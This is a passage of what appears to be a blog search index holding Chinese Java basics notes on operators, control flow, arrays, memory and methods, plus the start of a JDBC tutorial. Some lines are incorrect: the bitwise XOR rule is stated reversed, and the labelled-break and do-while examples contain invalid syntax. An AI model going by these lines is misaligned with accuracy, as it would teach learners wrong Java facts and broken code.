符号包含：\u0026,|,^,!,\u0026\u0026,|| 与运算\u0026：一假即假，全真才真。 或运算|：一真即真，全假才假。 异或运算^：相同为假，不同为真。(异或即求异) 非运算!：只连接一个，转为反面 (注：!!可两个以上相连使用不会报错)。 短路：双与双或 结果与\"单与\"和\"单或\"一样。 \u0026：两边都参与运算；\u0026\u0026：左为false时，右边不执行。 |：两边都参与运算；||：左为true时，右边不执行。 示例： int a = 10, b = 20; System.out.println((a++ \u003e 10) \u0026\u0026 (b++ \u003e 20));//先算a与10的比较，后a++，不成立则短路，false System.out.println(a);//a=11 System.out.println(b);//b=20 短路未执行，因此不变 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:5","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"三元运算符 格式：(关系表达式)?表达式1：表达式2； 如果条件为true，运算后的结果是表达式1； 如果条件为false，运算后的结果是表达式2； 获取两个数中大数： z = (x\u003ey)?x:y;//z变量存储的就是两个数的大数。 比较两个整数是否相同： boolean b = (a==b) ? true : false; boolean b = (a==b); //其实这样写就可以了，上一行是为了演示三元运算符 获取三个数中的最大值： int temp = (a\u003eb) ? a: b; int max = (temp\u003ec) ? temp: c; ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:6","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"位运算符 左移和右移： 左移：二进制位向左移动，相当于乘以2的次幂运算，移动几位就是几次幂。 右移：二进制位向右移动，相当于除以2的次幂运算，移动几位就是几次幂。（整除） 好处：运算速度快；弊端：只能操作2的倍数。 右移和无符号右移： 右移：最高位补位原则是，原最高位是什么，就补什么； 无符号右移：空位补0。 无符号右移：不用于做除法，用于获取二进制中的某些位。 与\u0026、或|：同逻辑运算符的位运算。 异或^：位相同取1，不同取0。 性质：a^b^b=a;，可以用于简单加密。 反码~：二进制的每一位，0变成1，1变成0 当n为正数时，~(n) = -(n+1) 当n为负数时，~(-n) = |n| - 1，忽略负号。 例如：~6+1 = -6;，~(-3) = 2 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:7","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"经典面试题：两个整数互换 三种方法：通过第三方变量；通过和；通过异或。 第三方：temp = a; a = b; b = temp 通过和(可能超出范围，慎用)：a = a+b; b = a-b; a = a-b; //和-自己=另一个数 通过异或：a=a^b; b=a^b; a=a^b; //a^b^b=a a=a^b; b=a^b=(a^b)^b=a; a=a^b=(a^b)^a=(b^a)^a=b; (根据两数异或的原理，可知交换律符合，故可得) ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:8","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"运算符优先级 括号\u003e符号\u003e乘除加减\u003e位移\u003e逻辑大于小于\u003e逻辑等等于\u003e与或非\u003e双与双非\u003e三目\u003e赋值(=、某=) ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:9","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:10","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"程序流程控制 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"顺序结构 按照代码的先后顺序，依次执行。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"选择结构： 控制语句体的执行与否，又叫分支结构，有if和switch两种。 if语句： 格式1：一种情况的判断 首先执行关系表达式；如果true，就执行语句体；否则为false，则不执行语句体。 if(关系表达式) { 语句体 } 格式2：两种情况的判断 首先执行关系表达式；如果true，就执行语句体1；否则为false，则执行语句体2。 if(关系表达式) { 语句体1; } else { 语句体2; } 格式3：多种情况的判断 - 首先执行关系表达式1，为true则执行语句体1；否则执行表达式2，为true则执行语句体2；…；否则，执行语句体n+1. - 注意：是判断就可能为false，因此若语句体都是对相同变量赋值，如果语句体n+1为空，则会编译报错，需要完善。 if(关系表达式1) {语句体1;} else if (关系表达式2) {语句体2;} … else {语句体n+1;} switch语句： 关键字：switch，case，default，break。 格式： switch(表达式) { case 值1： 语句体1; break; case 值2： 语句体2; break; … default： 语句体n+1; break; } 表达式的取值：byte,short,int,char, JDK5以后可以是枚举, JDK7以后可以是String； case后面的值：要和表达式进行比较的值； 注意：case标签不能重复，重复产生了不确定性。 语句体部分可以是一条或多条语句； break表示中断，结束的意思，可以结束switch语句； 注意：如果没有break，则运行到switch语句的最后结束。 default语句表示所有情况都不匹配的时候，就执行该处的内容，和if语句的else相似。 注意：无论摆放位置如何，都是按照case-\u003edefault的顺序。 执行流程：计算表达式；将结果与case后的值比较，遇break结束；都不匹配，则执行default。 注意：找到某case或从default执行时，到break或switch末尾结束。 如果某case没break，则继续向下执行下面的case的内容直到遇到break或switch末尾。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"循环结构： 控制语句体循环，直到不再满足循环条件 循环语句的组成： 初始化语句，判断条件语句，循环体语句，控制条件语句。 三种：for, while, do…while for语句： 格式： for(初始化语句;判断条件语句;控制条件语句) {循环体语句;} 执行流程： 初始化；判断条件语句，false则结束循环，否则继续；循环体语句；控制条件语句；重新执行判断条件语句。 示例： 水仙花数是指一个三位数，其各位数字的立方和等于该数本身。 隐含了范围是100-999，因此for(int i=100;i\u003c1000;i++){...} 个位：153%10；十位：153/10%10；百位：153/10/10%10。 PS: 水仙花数一共有4个 (153, 370, 371, 407). while循环： 格式： 初始化语句; while(判断条件语句) { 循环体语句; 控制条件语句; } do-while循环： 格式：注意，while后面还有分号的。 初始化语句; do{ 循环体语句; 控制条件语句; }while((判断条件语句); 三种循环的区别： do…while循环至少会执行一次循环体。 for循环和while循环只有在条件成立的时候才会去执行循环体 for循环语句和while循环语句的小区别： 控制条件语句所控制的那个变量，在for循环结束后，就不能再被访问到了，而while循环结束还可以继续使用； 因此，如果想继续使用，就用while，否则推荐使用for。 此处注意：变量有效范围。 三种循环选取优先级：for \u003e while \u003e do while. break和continue： 两者都只能用在循环中 (脱离使用场景则没有意义)。 break： 使用场景：switch语句；循环。 作用：跳出单层循环。即默认作用于所在循环。例如位于内层时break则跳出内循环。 注意：若内层break控制外循环，则可以使用标记符号标记内外循环。 示例：(continue也可以这样使用) outer: for(){ //注意冒号别丢了 inter: for(){ ....; break: outer;//直接跳出外循环。 //continue: outer; //继续外循环。 } } continue： 使用场景：循环。 注意：break和continue如果单独存在，该条语句下面都不可以有语句(永远执行不到的废物语句，会报错) 两者的区别：break-退出当前循环；continue-退出本次循环，并继续下次循环。 无限循环： 格式：while(true){}, for(,,){} 存在的原因：并不知道循环多少次，而是根据某些条件来控制循环；控制循环语句一般放在循环体中，并配合break等使用。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"一维数组 概述： 数组是存储同一种数据类型多个元素的容器。 数组既可以存储基本数据类型，也可以存储引用数据类型。 特点注意： 元素类型必须一致； 元素有整数索引； 长度一旦定义好就无法改变； 可以存储基本数据类型，也可存储引用数据类型。 定义数组： 格式1：数据类型[] 数组名; – 推荐使用 格式2：数据类型 数组名[]; 注意：这两种定义做完了，数组中是没有元素值的。需要初始化。 数组的初始化： 定义：为数组中的数组元素分配内存空间，并为每个数组元素赋值。 分类： 动态初始化：初始化时只指定数组长度，由系统为数组分配初始值(默认初始化)。 静态初始化：初始化时指定每个数组元素的初始值，由系统决定数组长度。 动态初始化： 格式：数据类型[] 数组名 = new 数据类型[数组长度]; new：为数组申请内存分配，开辟空间。 未指定数组元素时，通过数值名输出地址值，例如打印arr输出 [I@15db9742 地址值 [I@15db9742 ： 一个方括号表示一维数组，I表示int型，@是分隔符，后面是哈希值。 访问数组元素：使用索引值。例如arr[i]。 静态初始化： 格式：数据类型[] 数组名 = new 数据类型[]{元素1,元素2,…}; 注意后面小括号不定义数组长度，以免不一致造成不确定性。 简写：数据类型[] 数组名 = {元素1,元素2,…};，例如：int[] arr = {1,2,3}; 数组属性：length – 获取数组中元素的个数。 使用：数组名.length; 数组获取最值的思路： 注意：参照物从数组元素中取，否则容易出现取太大超过所有数组元素的情况。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"二维数组 概述：二维数组其实就是元素为一维数组的数组。 定义格式： 数据类型[][] 数组名; – 推荐 数据类型 数组名[][]; – 不推荐 数据类型[] 数组名[]; – 不推荐 初始化方式： 动态初始化：数据类型[][] 变量名 = new 数据类型[m][n]; m：二维数组中的一维数组的个数，n：一维数组的元素个数。 静态初始化：数据类型[][] 变量名 = new 数据类型[][]{ {元素},{元素},{元素} }; 简化版格式：数据类型[][] 变量名 = { {元素},{元素},{元素} }; 二维数组名+索引：获取一维数组地址名 例如：arr[][]={ {},{},..,{} }; syso(arr); – 二维数组地址值：例如[[I@6d06d69c ，两个方括号表示是二维数组。 syso(arr[1]); – 二维数组中第二个一维数组的地址值：例如[I@7852e922 ，一个方括号表示一维数组。 遍历二维数组： int[][] arr2 = { {1,2,3,4},{5,6},{7,8,9} }; for(int i = 0; i \u003c arr2.length; i++) { for(int j = 0; j \u003c arr2[i].length; j++) { System.out.print(arr2[i][j]+\" \"); } System.out.println(); } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组初始化问题： 二维数组：左侧的方括号可以放在任意插空位置； 静态初始化：右侧可以直接赋值空花括号，不报错。例如int[] arr = {}; 这样相当于定义了一个长度为0的数组，里面没有元素，arr[0]也会越界异常。 如果后期要添加元素，可使用其他容器，比如ArrayList等。 动态初始化：一维必须指定数组长度，二维必须指定前一个方括号中的值(降维为一维理解)。 关于二维数组动态初始化只赋值前一个方括号： 没有指定一维数组的长度，则一维数组在内存中不存在； 长度一旦确定，数组实体就会new出来； 长度不确定，数组实体就还不存在。 示例：int[][] arr=new int[3][]; syso(arr)：输出arr地址值； syso(arr[0])：输出null，开辟了空间，但其中的一维数组没有new出来； syso(arr[0][0])：空指针异常，arr[0]已经是null为空了，不能操作该数组中的元素。 new一维数组：arr[0] = new int[5];，之后再打印[0][0]就不会空指针异常了。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"地址值概述 示例：[[I@6d06d69c [[：表示二维数组，如果是一个方括号，表示一维数组； I：表示int类型； @：分隔符； 后面的数字：16进制哈希值，由哈希算法得出，表示实体在内存中的位置。 即：看到哈希值，说明必然有实体。 注：打印数组名特例 – char[] chs 数值型数组如int型数组：初始化后直接打印数组名，输出的是地址值。 char类型数组输出总结: 直接输出数组名：将数组以字符串形式打印； 输出前面加字符：输出的是地址； 输出前面加字符的情况下想要输出数组内容：Arrays.toString(ch)，数组内容将以数组形式输出： 注：直接打印字符串变量名，输出的也是字符串内容；前面加字符串后，输出的仍是字符串内容。 注：字符串数组直接输出的是地址值。 参考：【JAVA】java中char类型数组用数组名打印结果不是地址值而是数组内容 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组常见问题： 数组索引越界异常：ArrayIndexOutOfBoundsException 产生原因：访问到了数组中的不存在的索引时发生。 空指针异常：NullPointerException 产生原因：数组引用没有指向对象，却在操作对象中的元素或使用数组名访问元素。 例如：arr=null; syso(arr[1]); 引用类型：类，接口，数组。 空常量：null，可以赋值给引用类型变量。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:5","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:6","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"java内存分配 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"分类： 栈：存储局部变量； 堆：存储new出来的东西，实体、对象；new：进行空间开辟。 方法区：(面向对象进阶讲)； 本地方法区：(和系统相关)； 寄存器：(给CPU使用)。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"栈：存储局部变量。 栈的读取速度比堆快。 局部变量：定义在方法中的变量； 一旦生命周期结束，即使用完毕后，立即回收。 基本数据类型会一直在栈中创建，当声明基本类型时，不需要new。 基本类型一旦被声明，java将在栈上直接存储它，所以基本类型的变量表示的是数据本身。 假如调用基本类型的包装类来创建对象，那么将会在堆中创建。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"堆：存储new出来的东西，实体、对象。 堆的读取速度比栈慢。 每个对象都有地址值； 每个对象的数据都有默认值： byte, short, int, long: 0; float, double: 0.0; char:’\\u0000’; – unicode编码的空字符。 boolean: false; 对象：null. 使用完毕后，会在垃圾回收器空闲的时候回收。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组内存： 定义的局部变量arr只存数组实体的地址(引用型变量)； 实体对象在堆内存中，通过new来开辟空间。 java中的内存分配图解： 一个数组的内存图： 两个数组的内存图： 两个数组指向同一个地址的内存图： 静态初始化内存图 数组操作的两个常见小问题 数组操作之获取最值图解 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:5","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法概述 方法就是完成特定功能的代码块 在很多语言里面都有函数的定义 函数在Java中被称为方法 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法的格式： 方法三要素：函数名，参数列表，结果类型。 格式： 修饰符 返回值类型 方法名(参数类型 参数名1，参数类型 参数名2…) { 函数体; return 返回值; } 格式解释： 修饰符：public static 返回值类型：用于限定返回值的数据类型 方法名：一个名字，为了方便我们调用方法 参数类型：用于接收调用方法时传入的数据的类型 参数名：用于接收调用方法时传入的数据的变量 方法体：完成功能的代码 return：结束方法，把返回值带给调用者(返回值为void时可以省略，或return;) 注：return不能写在最前面，否则后面的语句都执行不到了，同break。 注意：函数中只能调用函数，不能在函数内部定义函数。（存疑） ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"写方法 写一个方法首先有两点需要明确： 返回值类型：明确功能结果的数据类型； 参数列表：明确有几个参数，以及参数的类型。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法的调用 方法的一个很重要的特点：不调用不执行。 有明确返回值的方法调用： 单独调用：没有意义；(eg. sum(10,20);, 调用了但是什么都没有做，没有联系) 输出调用：有意义，但是不够好，因为不一定非要把结果输出； 赋值调用：推荐方式。 图解：求和方法的调用图解 没有明确返回值的方法调用： 其实就是void类型方法的调用(没有返回值类型也不能把返回值类型这里空着)； 参数列表：可以为空，例如void printHW(){...}； 只能单独调用，例如printHW(); – （是与输出调用和赋值调用相比）。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法的重载 方法重载概述： 在同一个类中，方法名相同，参数列表不同的情况。 方法重载特点： 方法名相同，参数列表不同。 参数列表不同：参数个数或者参数类型不同 注：参数列表是有顺序的，(int, float)和(float,int)也算重载。 注：参数个数不同包括一个是多参数，一个是空参数的情况。 在调用时，java虚拟机通过参数列表的不同来区分同名方法。 注：与返回值类型无关，只看方法名和参数列表 参考int sum(int a, int b)和int sum(int a, int b, int c)； ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:5","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"方法参数传递问题 形式参数：用于接收实际参数的变量。 实际参数：实际参与运算的变量。 方法的形式参数是基本数据类型：形式参数的改变不影响实际参数。 图解： 方法的形式参数是引用数据类型：形式参数的改变直接影响实际参数。 传递的是引用型变量的地址值，因此改变后，是对本体进行改变的。 图解： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:6","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:7","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"基础语法练习 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"录入月份输出对应季节 记得做非法输入判断 (包含对不属于1-12范围输入的判断) 用switch比if-else判断好一点； 整合相同季节，而不是每个月份数字做一次判断； if-else：可以用或连接多个月份数字，或者用范围；冬季12,1,2用范围不好表示可以放在最后的else里。 switch：case穿透，将相同的季节的case放在一起穿透 case 3: case 4: case 5: syso(\"春季\"); break; ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"斐波那契数列问题 前两项和等于新的数的数列：1,1,2,3,5,,…. 注意第一项和第二项是从几开始的。 跳台阶问题同(跳台阶方法数为斐波那契数列)。 生兔子问题同(兔子总数为斐波那契数列)。 求解方法： 递归； 数组保存每个结果； 用变量保存前两项，并不断更新前两项变量的值。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"评委打分问题 题目：竞赛中有6个评委打分(0-100)，去掉最高分和最低分后的平均分为最后得分，求最终得分。 思路：键盘获取6个打分并存入数组中，写’getMax()‘,’getMin()‘,’getSum()‘三个方法并调用，avg=(sum-max-min)/(arr.length-2) 注：就最简单最质朴的解决思路，没有花里胡哨的技巧 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组元素反转 双指针从两端向中间遍历，同时交换两指针对应的元素，直到两指针相遇；仔细考虑临界条件! 交换两个数：常规是利用第三方变量；或者利用两数和；或者利用两数异或。 关键代码：for(int start=0, end=arr.length-1; start\u003c=end; start++,end--){} 图解 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数组基本查找 题目：定义一个数组，键盘录入被查找数据，写方法得到target第一次出现的索引值 思路：写方法时for循环遍历数组，比较每个元素与target，循环内if判断，相等时返回 注意点：既然是if判断，就有可能全部不符合，但是返回值类型又是一个int型数值，因此需要在for循环外额外加一个return -1； 这一点在编程题目中非常常见，引起注意 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:5","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"加密数字 要求对一个四位数的每个位的数字进行各种操作： eg. 每一位数+5, 对10取余，之后1 4位和2 3位交换 可以将每个位的数字拆开，并放入一个数组中，便于操作。 拆开指：arr[0](千位)=a/10/10/10%10;, arr[1]=a/10/10%10;,arr[2]=a/10%10;,arr[3]=a%10; ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:6","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:7","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"END ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:8","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"JDBC简介 JDBC是什么？JDBC英文名为：Java Data Base Connectivity(Java数据库连接)，官方解释它是Java编程语言和广泛的数据库之间独立于数据库的连接标准的Java API，根本上说JDBC是一种规范，它提供的接口，一套完整的，允许便捷式访问底层数据库。可以用JAVA来写不同类型的可执行文件：JAVA应用程序、JAVA Applets、Java Servlet、JSP等，不同的可执行文件都能通过JDBC访问数据库，又兼备存储的优势。简单说它就是Java与数据库的连接的桥梁或者插件，用Java代码就能操作数据库的增删改查、存储过程、事务等。 我们可以发现，JDK自带了一个java.sql包，而这里面就定义了大量的接口，不同类型的数据库，都可以通过实现此接口，编写适用于自己数据库的实现类。而不同的数据库厂商实现的这套标准，我们称为数据库驱动。 ","date":"2024-03-04","objectID":"/articles/2024/03/jdbc-1/:1:0","tags":["JDBC","数据库","SQL"],"title":"JDBC-1-基础","uri":"/articles/2024/03/jdbc-1/"},{"categories":["Java"],"content":"使用前准备 将mysql驱动jar依赖导入到项目中，下载地址：http://dev.mysql.com/downloads/connector/j/，这是MySQL的官方实现，也可以使用其他相应版本的数据库驱动。 ","date":"2024-03-04","objectID":"/articles/2024/03/jdbc-1/:2:0","tags":["JDBC","数据库","SQL"],"title":"JDBC-1-基础","uri":"/articles/2024/03/jdbc-1/"},{"categories":["Java"],"content":"使用JDBC连接数据库 总共分为四步进行： 首先使用DriverManager获得数据库连接 Connection connection = DriverManager.getConnection(\"URL\",\"root\",\"password\"); 创建一个用于执行SQL的Statement对象 Statement statement = connection.createStatement(); 注意：以上两个对象使用后均需要释放，可以使用try-with-resource自动释放资源。若出现错误，将抛出SQLException异常。 使用statement.executeQuery执行SQL语句并且范围结果集 ResultSet set = statement.executeQuery(\"select * from teacher\"); 遍历结果集对结果进行操作 System.out.println(set.getString(1)); 测试代码： import java.sql.*; public class JDBC { public static void main(String[] args) { try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/study\",\"root\",\"998244353\"); Statement statement = connection.createStatement()) { ResultSet set = statement.executeQuery(\"select * from teacher\"); while (set.next()) { System.out.println(set.getString(2)); } }catch (SQLException e) { e.printStackTrace(); } } } ","date":"2024-03-04","objectID":"/articles/2024/03/jdbc-1/:3:0","tags":["JDBC","数据库","SQL"],"title":"JDBC-1-基础","uri":"/articles/2024/03/jdbc-1/"},{"categories":["Java"],"content":"了解DriverManager 我们首先来了解一下DriverManager是什么东西，它其实就是管理我们的数据库驱动的： public static synchronized void registerDriver(java.sql.Driver driver, DriverAction da) throws SQLException { 